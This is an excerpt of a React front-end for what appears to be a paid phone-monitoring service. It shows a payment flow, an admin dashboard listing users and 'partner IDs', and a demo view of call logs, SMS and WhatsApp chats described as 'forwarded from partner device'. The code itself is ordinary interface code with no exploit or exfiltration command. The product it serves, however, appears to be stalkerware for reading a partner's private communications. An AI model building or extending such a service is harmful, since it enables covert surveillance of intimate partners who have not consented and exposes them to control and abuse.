...
@media(max-width:768px){
  ...
  .sb{position:fixed;left:0;bottom:0;top:auto;width:100%;flex-direction:row;overflow-x:auto;z-index:200;border-top:1px solid rgba(201,168,76,0.12);border-right:none;padding:6px 8px;gap:4px;max-height:64px;}
  .sb .sl{flex-direction:column;gap:2px;font-size:9px;padding:6px 8px;min-width:52px;flex-shrink:0;border-radius:10px;}
  .sb > div:last-child{display:none;}
  .tbl{font-size:11px;}
  .tbl th,.tbl td{padding:8px 8px;}
  .glass{border-radius:14px;}
  .sub-tabs{padding:10px;gap:5px;}
  .sub-tabs .btn-tab{font-size:10px;padding:5px 9px;}
  .btn-gold,.btn-out{font-size:13px;padding:11px 18px;}
  input.inp,textarea.inp,select.inp{font-size:14px;}
}
@media(max-width:480px){
  .ct{padding:0 12px;}
  .raj{letter-spacing:.02em;}
  ...
  const handleConfirm = async () => {
    ...
    try {
      if (user?.id) {
        ...
        await supa(`payments`, "POST", { user_id: user.id, plan, amount: plan === "3 Months" ? 79 : plan === "6 Months" ? 100 : 300, method, status: "pending" }, token);
...
const Activity = ({ user, onDisc, setPM }) => {
  ...
  const FALLBACK_STREAMS = [
    { id:"calls",    lb:"Call Log",       ic:"phone",    lk:false, subs:[{id:"all",lb:"All Calls",icon:"📋"},{id:"received",lb:"Received",icon:"📞"},{id:"outgoing",lb:"Outgoing",icon:"📤"},{id:"missed",lb:"Missed",icon:"❌"}] },
    { id:"sms",      lb:"SMS",            ic:"msg",      lk:false, subs:[{id:"all",lb:"All Messages",icon:"💬"},{id:"received",lb:"Received",icon:"📥"},{id:"sent",lb:"Sent",icon:"📤"}] },
    { id:"whatsapp", lb:"WhatsApp",       ic:"whatsapp", lk:false, subs:[{id:"all",lb:"All Chats",icon:"💚"},{id:"received",lb:"Received",icon:"📥"},{id:"sent",lb:"Sent",icon:"📤"},{id:"groups",lb:"Groups",icon:"👥"},{id:"media",lb:"Media",icon:"🖼️"}] },
...
const AdminDash = ({ user, setUser, sp }) => {
  ...
  const load = async () => {
    setLoading(true);
    try { const u = await supa("profiles?select=*&order=created_at.desc").catch(() => []); setUsers(u || []); } catch (e) { console.log(e); }
    try { const p = await supa("partner_ids?select=*&order=created_at.desc").catch(() => []); setPids(p || []); } catch (e) { console.log(e); }
    try { const r = await supa("reviews?select=*&order=created_at.desc").catch(() => []); setReviews(r || []); } catch (e) { console.log(e); }
    try { const pay = await supa("payments?select=*&order=created_at.desc").catch(() => []); setPayments(pay || []); } catch (e) { console.log(e); }
    try { const t = await supa("tickets?select=*&order=created_at.desc").catch(() => []); setTickets(t || []); } catch (e) { console.log(e); }
    setLoading(false);
  };
  ...
  return (
    <div style={{ paddingTop: 70, display: "flex", minHeight: "100vh" }}>
      ...
      <div style={{ flex: 1, padding: "32px 28px", overflow: "auto" }}>
        {loading && <div style={{ display: "flex", justifyContent: "center", padding: 40 }}><div style={{ width: 36, height: 36, borderRadius: "50%", border: `2px solid ${GOLD}`, borderTopColor: "transparent", animation: "spin 1s linear infinite" }} /></div>}
...
const Demo = ({ sp }) => {
  ...
  return (
    <div style={{ paddingTop:70 }}>
      <div style={{ background:"linear-gradient(90deg,rgba(201,168,76,0.12),rgba(201,168,76,0.04))", borderBottom:"1px solid rgba(201,168,76,0.2)", padding:"10px 24px", textAlign:"center" }}>
        <p style={{ fontSize:12, color:"#A8B0C2" }}><span className="tag tg" style={{ marginRight:10 }}>DEMO MODE</span>All data is simulated. <button onClick={() => sp("register")} style={{ color:GOLD, background:"none", border:"none", cursor:"pointer", fontWeight:700 }}>Create account to access real sync →</button></p>
      </div>
      <div style={{ display:"flex", height:"calc(100vh - 112px)" }}>
        {/* Sidebar */}
        <div className="sb">
          <div style={{ padding:"13px 20px 14px", borderBottom:"1px solid rgba(201,168,76,0.1)", marginBottom:7 }}>
            <div style={{ display:"flex", alignItems:"center", gap:7 }}><span className="dot on ap" /><span className="raj" style={{ fontSize:11, color:GOLD, fontWeight:700 }}>DEMO — Simulated</span></div>
          </div>
          {streams.map(s => (
            <button key={s.id} className={`sl${tab===s.id?" active":""}`} onClick={() => chg(s.id)}>
              <Ic n={s.ic} sz={14} /><span style={{ flex:1 }}>{s.lb}</span>
              <span style={{ fontSize:9, color:MUTED }}>{s.subs.length}</span>
            </button>
          ))}
          <div style={{ padding:"14px 11px", marginTop:8, borderTop:"1px solid rgba(201,168,76,0.1)" }}>
            <button className="btn-gold" style={{ width:"100%", justifyContent:"center", padding:"9px", fontSize:12 }} onClick={() => sp("register")}><Ic n="zap" sz={13} />Create Account</button>
          </div>
        </div>

        {/* Main content */}
        <div style={{ flex:1, overflow:"auto", background:DARK, padding:"18px 22px" }}>
          {/* Stream header — shows active sub-tab title & description from admin */}
          {(() => {
            const activeSub = (cur?.subs || []).find(s => s.id === sub) || cur?.subs?.[0];
            return (
              <div style={{ display:"flex", justifyContent:"space-between", alignItems:"flex-start", marginBottom:14 }}>
                <div>
                  <h2 className="raj" style={{ fontSize:18, fontWeight:700, marginBottom:2 }}>
                    {activeSub?.title || cur?.lb}
                  </h2>
                  <p style={{ color:MUTED, fontSize:12, maxWidth:500, lineHeight:1.5 }}>
                    {activeSub?.desc || "Demo data — forwarded from partner device"}
                  </p>
                </div>
                <span className="tag tgg" style={{ fontSize:10, flexShrink:0, marginLeft:12 }}><span className="dot on" style={{ width:6, height:6 }} /> Live</span>
              </div>
            );
          })()}
          ...
          <div className="sub-tabs">
            {(cur?.subs || []).map(s => (
              <button key={s.id} className={`btn-tab${sub===s.id?" active":""}`} onClick={() => setSub(s.id)} style={{ gap:5 }}>
            ...
            <div className="ad">
              {sub==="live" && (
                <div className="glass" style={{ overflow:"hidden", height:300 }}>
                  <div style={{ height:"100%", background:"linear-gradient(135deg,rgba(201,168,76,0.06),rgba(192,199,212,0.02))", display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center", gap:16 }}>
